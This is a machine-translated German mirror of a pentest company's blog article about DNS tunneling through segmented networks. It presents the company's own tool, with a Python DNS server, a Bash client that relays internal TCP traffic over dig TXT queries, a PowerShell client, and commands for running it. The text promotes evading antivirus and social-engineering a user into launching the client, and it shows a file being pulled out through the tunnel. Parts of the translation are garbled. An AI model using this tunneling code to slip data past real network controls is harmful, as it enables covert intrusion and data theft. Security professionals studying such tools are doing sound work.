<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🍮 👨‍⚕️ 💮 Verkehr am Ende des Tunnels oder DNS im Pentest 🤷🏿 🤙🏻 📟</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hallo! In Penetrationstestprojekten stoßen wir häufig auf hart segmentierte Netzwerke, die fast vollständig von der Außenwelt isoliert sind. Um dieses...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Verkehr am Ende des Tunnels oder DNS im Pentest</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Hallo!  In Penetrationstestprojekten stoßen wir häufig auf hart segmentierte Netzwerke, die fast vollständig von der Außenwelt isoliert sind.  Um dieses Problem zu lösen, ist es manchmal erforderlich, den Datenverkehr über das einzige verfügbare Protokoll - DNS - weiterzuleiten.  In diesem Artikel erfahren Sie, wie Sie ein ähnliches Problem im Jahr 2018 lösen und welche Fallstricke dabei auftreten.  Beliebte Dienstprogramme werden ebenfalls überprüft und eine Version ihres eigenen Open-Source-Dienstprogramms mit Funktionen vorgestellt, die in vorhandenen ähnlichen Tools normalerweise nicht vorhanden sind. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  Was sind DNS-Tunnel? </h1><br><p>  Es gibt bereits <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">mehrere</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel</a> über Habré, die erklären, was DNS-Tunneling ist.  Ein wenig Theorie zum DNS-Tunneling finden Sie jedoch unter dem Spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">Was ist DNS-Tunneling?</b> <div class="spoiler_text"><p>  Es kommt vor, dass der Zugriff auf das Netzwerk durch die Firewall stark eingeschränkt wird und Sie die Daten sehr schlecht übertragen müssen. Dann hilft die DNS-Tunneling-Technik. </p><br><p>  Im Diagramm sieht alles so aus: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  Abfragen für DNS werden selbst mit den strengsten Firewall-Einstellungen manchmal noch bestanden, und Sie können diese verwenden, indem Sie sie von Ihrem Server auf der anderen Seite beantworten.  Die Kommunikation wird extrem langsam sein, dies reicht jedoch aus, um in das lokale Netzwerk des Unternehmens einzudringen oder beispielsweise dringend über kostenpflichtiges WLAN im Ausland auf das Internet zuzugreifen. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  Was ist im Moment beliebt </h1><br><p>  Jetzt finden Sie im Internet viele Dienstprogramme zum Bedienen dieser Technik - jedes mit seinen eigenen Funktionen und Fehlern.  Wir haben die fünf beliebtesten für Vergleichstests ausgewählt: </p><br><ul><li>  dnscat2 </li><li>  Jod </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  Weitere Informationen dazu, wie wir sie getestet haben, finden Sie in unserem Artikel über <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hacker</a> .  Hier geben wir nur die Ergebnisse an. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  Wie Sie den Ergebnissen entnehmen können, können Sie arbeiten, aber unter dem Gesichtspunkt der Penetrationstests gibt es Nachteile: </p><br><ul><li>  kompilierte Clients - Auf Computern mit Virenschutzprogrammen ist es viel einfacher, etwas Interpretiertes auszuführen als eine Binärdatei. </li><li>  instabile Arbeit unter Windows; </li><li>  die Notwendigkeit, in einigen Fällen zusätzliche Software zu installieren. </li></ul><br><p>  Aufgrund dieser Mängel mussten wir unser eigenes Tool entwickeln, und so stellte sich heraus ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Erstellen Sie Ihr eigenes DNS-Tunneling-Dienstprogramm </h1><br><h2 id="predystoriya">  Hintergrund </h2><br><p>  Alles begann während des internen Pentests einer Bank.  In der Lobby befand sich ein öffentlicher Computer, auf dem Dokumente, Zertifikate und andere Papiere gedruckt wurden.  Unser Ziel: Um den größtmöglichen Nutzen aus einem Computer zu ziehen, auf dem Windows 7 ausgeführt wird, Kaspersky Anti-Virus an Bord hatte und nur auf bestimmte Seiten zugreifen konnte (gleichzeitig konnten DNS-Namen aufgelöst werden). </p><br><p>  Nachdem wir die erste Analyse durchgeführt und zusätzliche Daten vom Auto erhalten hatten, entwickelten wir mehrere Angriffsvektoren.  Die Pfade mit dem Betrieb der Maschine unter Verwendung von Binärprogrammen wurden sofort zur Seite entfernt, da der "große und schreckliche" "Kaspersky" seine Löschung sofort erkannte, als er eine ausführbare Datei entdeckte.  Es gelang uns jedoch, die Möglichkeit zu erhalten, Skripte im Auftrag des lokalen Administrators auszuführen. Danach war eine der Ideen nur die Möglichkeit, einen DNS-Tunnel zu erstellen. </p><br><p>  Auf der Suche nach möglichen Methoden haben wir in PowerShell einen Client für dnscat2 gefunden (wir haben bereits darüber geschrieben).  Am Ende konnten wir jedoch nur für kurze Zeit eine Verbindung herstellen, wonach der Client abstürzte. </p><br><p>  Dies hat uns, gelinde gesagt, sehr verärgert, da in dieser Situation die Anwesenheit eines interpretierten Klienten einfach notwendig war.  Dies war einer der Gründe für die Entwicklung eines eigenen Tools für das DNS-Tunneling. </p><br><h2 id="trebovaniya">  Anforderungen </h2><br><p>  Unsere Hauptanforderungen an uns selbst sind: </p><br><ul><li>  das Vorhandensein von universellen (soweit möglich) und interpretierten Clients für Unix- und Windows-Systeme.  Für Kunden wurden Bash und Powershell ausgewählt.  In Zukunft ist ein Perl-Client für Unix geplant. </li><li>  die Fähigkeit, Datenverkehr von einer bestimmten Anwendung weiterzuleiten; </li><li>  Unterstützung für mehrere Clients für einen Benutzer. </li></ul><br><h2 id="arhitektura-proekta">  Projektarchitektur </h2><br><p>  Basierend auf den Anforderungen haben wir mit der Entwicklung begonnen.  Aus unserer Sicht besteht das Dienstprogramm aus drei Teilen: einem Client auf dem internen Computer, einem DNS-Server und einem kleinen Proxy zwischen der Pentester-Anwendung und dem DNS-Server. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  Zunächst haben wir beschlossen, den Tunnel über TXT-Datensätze weiterzuleiten. </p><br><p>  Das Funktionsprinzip ist ganz einfach: </p><br><ul><li>  Pentester startet einen DNS-Server. </li><li>  Ein Pentester (oder ein Benutzer über Social Engineering) startet einen Client auf einem internen Computer.  Auf dem Client gibt es Parameter wie den Clientnamen und die Domäne, und es besteht auch die Möglichkeit, die IP-Adresse des DNS-Servers direkt anzugeben. </li><li> Ein Pentester (von einem externen Netzwerk) startet einen Proxy, in dem er die IP-Adresse des DNS-Servers sowie den zu klopfenden Port, IP-Ziele (z. B. ssh im internen Netzwerk, in dem sich der Client befindet) und dementsprechend den Zielport angibt.  Außerdem ist eine Client-ID erforderlich, die durch Hinzufügen des Schlüssels <code>--clients</code> abgerufen werden kann. </li><li>  Pentester startet die für ihn interessante Anwendung und zeigt den Proxy-Port auf localhost. </li></ul><br><h2 id="protokol-obscheniya">  Kommunikationsprotokoll </h2><br><p>  Stellen Sie sich ein ziemlich einfaches Protokoll für die Kommunikation zwischen einem Server und einem Client vor. </p><br><h3 id="registraciya">  Registrierung </h3><br><p>  Wenn der Client gestartet wird, registriert er sich beim Server und fordert einen TXT-Datensatz über eine Subdomain des folgenden Formats an: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - Registrierungsschlüssel <br>  <code>&lt;7 random chars&gt;</code> - um das Zwischenspeichern von DNS-Einträgen zu vermeiden <br>  <code>&lt;client name&gt;</code> - Der Name, der dem Client beim Start gegeben wurde <br>  <code>&lt;your domain&gt;</code> - Beispiel: xakep.ru <br>  Bei erfolgreicher Registrierung erhält der Client eine Erfolgsmeldung in der TXT-Antwort sowie die ihm zugewiesene ID, die er weiterhin verwendet. </p><br><h3 id="osnovnoy-cikl">  Hauptzyklus </h3><br><p>  Nach der Registrierung beginnt der Client, den Server nach der Verfügbarkeit neuer Daten im Format abzufragen </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  Wenn neue Daten vorhanden sind, werden sie in der TXT-Antwort im Format empfangen </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , andernfalls kommt <code>&lt;id&gt;ND</code> . </p><br><h3 id="cikl-zagruzki-dannyh">  Datenladezyklus </h3><br><p>  Der Client in einer Schleife prüft, ob Daten von unserem <code>&lt;target&gt;</code> .  Wenn es eine Antwort gibt, lesen wir aus dem, was angekommen ist, einen Puffer der Größe N Kb, <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> ihn in Blöcke mit einer <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> von <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> und senden Daten blockweise im folgenden Format: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  Wenn die Blockübertragung erfolgreich ist, erhalten wir einige Daten über den übertragenen Block. Wenn die Pufferübertragung abgeschlossen ist, erhalten wir <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  DNS-Server </h2><br><p>  Der Tunnel-DNS-Server wurde in Python3 mithilfe der dnslib-Bibliothek geschrieben. Dadurch können Sie ganz einfach Ihren eigenen DNS-Resolver erstellen, indem Sie vom Objekt dnslib.ProxyResolver erben und die Methode resolve () überschreiben. </p><br><p>  Mit Great DNSLIB können Sie sehr schnell Ihr eigenes Proxy-DNS erstellen: </p><br><div class="spoiler">  <b class="spoiler_title">Ein bisschen Servercode</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  In resolve () definieren wir die Antworten auf DNS-Anfragen vom Client: Registrierung, Anfordern neuer Einträge, Postback-Daten und Löschen des Benutzers. </p><br><p>  Wir speichern Informationen über Benutzer in der SQLite-Datenbank, die Daten-Zwischenablage befindet sich im RAM und hat die folgende Struktur, in der der Schlüssel die Client-Nummer ist: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP “” -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  “” <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  Um die Daten vom Pentester in den Puffer zu stellen, haben wir einen kleinen „Empfänger“ geschrieben, der in einem separaten Stream gestartet wird.  Es fängt Verbindungen vom Pentester ab und führt das Routing durch: an welchen Client Anforderungen gesendet werden sollen. </p><br><p>  Vor dem Starten des Servers muss der Benutzer nur einen Parameter festlegen: DOMAIN_NAME - den Namen der Domäne, mit der der Server arbeiten wird. </p><br><h2 id="klient-na-bash">  Bash Client </h2><br><p>  Bash wurde zum Schreiben eines Clients für Unix-Systeme ausgewählt, wie es in modernen Unix-Systemen am häufigsten vorkommt.  Bash bietet die Möglichkeit, eine Verbindung über / dev / tcp / herzustellen, auch mit nicht privilegierten Benutzerrechten. </p><br><p>  Wir werden nicht jeden Code im Detail analysieren, sondern nur die interessantesten Punkte betrachten. <br>  Das Prinzip des Kunden ist einfach.  Für die Kommunikation mit DNS wird das Standarddienstprogramm <code>dig</code> verwendet.  Der Client registriert sich beim Server und beginnt danach im fortwährenden Zyklus, Anforderungen unter Verwendung des zuvor beschriebenen Protokolls zu erfüllen.  Unter dem Spoiler mehr. </p><br><div class="spoiler">  <b class="spoiler_title">Lesen Sie mehr über den Bash-Client</b> <div class="spoiler_text"><p>  Es wird geprüft, ob eine Verbindung hergestellt wurde, und in diesem Fall wird die Antwortfunktion ausgeführt (Empfangene Daten vom Ziel lesen, aufteilen und an den Server senden). </p><br><p>  Danach wird geprüft, ob neue Daten vom Server vorhanden sind.  Wenn sie gefunden werden, prüfen wir, ob die Verbindung getrennt werden soll.  Die Lücke selbst tritt auf, wenn wir Informationen über das Ziel mit IP 0.0.0.0 und Port 00 erhalten. In diesem Fall löschen wir den Dateideskriptor (wenn er nicht geöffnet war, gibt es keine Probleme) und ändern die Ziel-IP auf die eingehende 0.0.0.0. </p><br><p>  Weiter unten im Code sehen wir, ob eine neue Verbindung hergestellt werden muss.  Sobald die folgenden Nachrichten uns Daten für das Ziel senden, ändern wir, falls die vorherige IP nicht mit der aktuellen übereinstimmt (dies wird nach dem Zurücksetzen der Fall sein), das Ziel in ein neues und stellen über den Befehl <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> eine Verbindung her <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , wobei <code>$ip</code> das Ziel ist, <code>$port</code> der Zielport. <br>  Wenn die Verbindung bereits hergestellt ist, wird das eingehende Datenelement dekodiert und fliegt über den Befehl <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , wobei <code>${data_array[2]}</code> ist, was wir vom Server erhalten haben. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Senden Sie nun die Antwortfunktion.  Zuerst lesen wir 2048 Bytes aus dem Deskriptor und codieren sie sofort durch <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Wenn die Antwort leer ist, verlassen wir die Funktion, andernfalls beginnen wir mit dem Teilen und Senden.  Beachten Sie, dass nach der Bildung der Anforderung zum Senden per Dig die Lieferung auf Erfolg geprüft wird.  Wenn dies erfolgreich ist, beenden Sie den Zyklus, andernfalls versuchen Sie es, bis es funktioniert. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Powershell-Kunde: </h2><br><p>  Da wir vollständige Interpretierbarkeit benötigen und auf den meisten aktuellen Systemen arbeiten müssen, ist der Basisclient für Windows das Standard-Dienstprogramm nslookup für die Kommunikation über DNS und das System.Net.Sockets.TcpClient-Objekt zum Herstellen einer Verbindung im internen Netzwerk. </p><br><p>  Alles ist auch sehr einfach.  Jede Iteration der Schleife ist ein Aufruf des Befehls nslookup unter Verwendung des zuvor beschriebenen Protokolls. </p><br><p>  Führen Sie zum Registrieren beispielsweise den folgenden Befehl aus, um sich zu registrieren: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  Wenn Fehler auftreten, werden sie nicht angezeigt und die Fehlerdeskriptorwerte an $ null gesendet. </p><br><p>  nslookup gibt uns eine ähnliche Antwort zurück: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  Danach müssen wir alle Zeilen in Anführungszeichen setzen, für die wir sie mit einer regulären Saison durchgehen: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Jetzt können Sie die empfangenen Befehle verarbeiten. <br>  Jedes Mal, wenn sich die IP-Adresse des „Opfers“ ändert, wird ein TCP-Client erstellt, eine Verbindung hergestellt und die Datenübertragung beginnt.  Vom DNS-Server werden die Informationen base64-decodiert und Bytes an das Opfer gesendet.  Wenn das „Opfer“ etwas beantwortet hat, codieren wir, teilen uns in Teile und führen nslookup-Anforderungen gemäß dem Protokoll aus.  Das ist alles. <br>  Wenn Sie Strg + C drücken, wird eine Anforderung zum Löschen des Clients ausgeführt. </p><br><h2 id="proxy">  Proxy: </h2><br><p>  Der Proxy für den Pentester ist ein kleiner Proxyserver in Python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  In den Parametern müssen Sie die IP des DNS-Servers angeben, den Port, an dem eine Verbindung zum Server hergestellt werden soll. Die Option --clients gibt eine Liste der registrierten Clients zurück. <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - id des Clients, mit dem wir zusammenarbeiten Arbeit (gesehen nach Ausführung von <code>--clients</code> ), - <code>--send_timeout</code> - Zeitüberschreitung für das Senden von Nachrichten aus der Anwendung. </p><br><p>  Beim Start mit dem Parameter <code>--clients</code> sendet der Proxy eine Anforderung im Format <code>\x00GETCLIENTS\n</code> an den Server. <br>  Wenn wir mit der Arbeit beginnen und eine Verbindung herstellen, senden wir eine Nachricht im Format <code>\x02RESET:client_id\n</code> , um die vorherige Verbindung zurückzusetzen.  Nachdem wir Informationen zu unserem Ziel <code>\x01client_id:ip:port:\n</code> <br>  Wenn wir Nachrichten an den Client senden, senden wir außerdem Bytes im Format <code>\x03data</code> und senden einfach <code>\x03data</code> an die Anwendung. <br>  Außerdem unterstützt der Proxy den SOCKS5-Modus. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  Welche Schwierigkeiten können auftreten? </h2><br><p>  Wie bei jedem Mechanismus kann das Dienstprogramm fehlschlagen.  Vergessen wir nicht, dass der DNS-Tunnel eine dünne Sache ist und viele Faktoren seinen Betrieb beeinflussen können, von der Netzwerkarchitektur bis zur Qualität der Verbindung zu Ihrem Produktionsserver. </p><br><p>  Während des Tests bemerkten wir gelegentlich kleine Störungen.  Bei hohen <code>--send_timeout</code> , die über ssh ausgeführt werden, lohnt es sich beispielsweise, den Parameter <code>--send_timeout</code> , da der Client sonst zu frieren beginnt.  Manchmal wird die Verbindung auch nicht beim ersten Mal hergestellt, sie kann jedoch einfach durch Neustart des Proxys behandelt werden, da die Verbindung während der neuen Verbindung zurückgesetzt wird.  Es gab auch Probleme mit der Domänenauflösung bei der Arbeit mit Proxy-Ketten. Dies kann jedoch auch behoben werden, wenn Sie einen zusätzlichen Parameter für Proxy-Ketten angeben.  Es ist anzumerken, dass das Dienstprogramm derzeit nicht das Auftreten unnötiger Anforderungen vom Zwischenspeichern von DNS-Servern steuert, sodass die Verbindung manchmal fehlschlägt. Dies wird jedoch erneut mit der oben beschriebenen Methode behandelt. </p><br><h2 id="zapusk">  Starten </h2><br><p>  Konfigurieren Sie NS-Einträge in der Domäne: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  Wir warten, bis der Cache aktualisiert ist (normalerweise bis zu 5 Stunden). </p><br><p>  Wir starten den Server: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Starten Sie den Client (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Wir starten den Client (Win): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Sehen wir uns die Liste der verbundenen Clients an: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Starten Sie den Proxy: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Testen: </p><br><p>  Nachdem der Server und mindestens ein Client gestartet wurden, können wir auf den Proxy zugreifen, als wäre es unser Remotecomputer. <br>  Versuchen wir, die folgende Situation zu simulieren: Ein Pentester möchte eine Datei von einem Server aus dem lokalen Netzwerk einer durch eine Firewall geschützten Organisation herunterladen. Mithilfe von Social-Engineering-Methoden konnte er einen DNS-Client zwingen, im Netzwerk ausgeführt zu werden und das SSH-Serverkennwort herauszufinden. </p><br><p>  Pentester startet auf seinem Computer einen Proxy, der den erforderlichen Client angibt, und kann dann ähnliche Anrufe tätigen, die an den Client und vom Client an das lokale Netzwerk gesendet werden. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Mal sehen, was passiert ist: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  Oben links sehen Sie die DNS-Abfragen, die an den Server gesendet werden, oben rechts - Proxy-Verkehr, unten links - Verkehr vom Client und unten rechts - unsere Anwendung.  Die Geschwindigkeit für den DNS-Tunnel erwies sich als recht anständig: 4,9 KBit / s bei Komprimierung. </p><br><p>  Beim Start ohne Komprimierung zeigte das Dienstprogramm eine Geschwindigkeit von 1,8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Schauen wir uns den DNS-Serververkehr genau an. Dazu verwenden wir das Dienstprogramm tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  Wir sehen, dass alles dem beschriebenen Protokoll entspricht: Der Client fragt den Server ständig ab, ob er neue Daten für diesen Client hat, indem er Anforderungen der Form <code>1c6Zx9Vi39.oversec.ru</code> .  Wenn Daten vorhanden sind, antwortet der Server mit einer Reihe von TXT-Datensätzen, andernfalls% client_num% ND ( <code>39ND</code> ).  Der Client sendet Informationen an den Server , welche Arten von Abfragen mit <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  In den folgenden Videos können Sie deutlich sehen, wie das Dienstprogramm in Verbindung mit meterpreter und im SOCKS5-Modus funktioniert. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  Das Ergebnis: </h2><br><p>  Lassen Sie uns ein wenig zusammenfassen.  Welche Funktionen hat diese Entwicklung und warum empfehlen wir die Verwendung? </p><br><ol><li>  Interpretierte Kunden auf Bash und Powershell: Keine EXE-Shnikov und ELF-s, deren Ausführung schwierig sein kann. </li><li>  Verbindungsstabilität: In den Tests verhielt sich unser Dienstprogramm viel stabiler, und wenn es Fehler gab, konnten Sie die Verbindung einfach wieder herstellen, während der Client nicht abstürzte, wie dies beispielsweise bei dnscat2 der Fall war. </li><li>  Ziemlich hohe Geschwindigkeit für den DNS-Tunnel: Natürlich erreicht die Geschwindigkeit kein Jod, aber es gibt eine viel niedrigere kompilierte Lösung. </li><li>  Es sind keine Administratorrechte erforderlich: Der Bash-Client funktioniert ohne Administratorrechte, und Powershell-Skripte sind manchmal durch Sicherheitsrichtlinien verboten, dies ist jedoch recht einfach. </li><li>  Es gibt einen socks5-Proxy-Modus, mit dem Sie <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> oder nmap im gesamten internen Netzwerk ausführen können. </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Der Dienstprogrammcode ist hier verfügbar.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de432078/">https://habr.com/ru/post/de432078/</a></p>
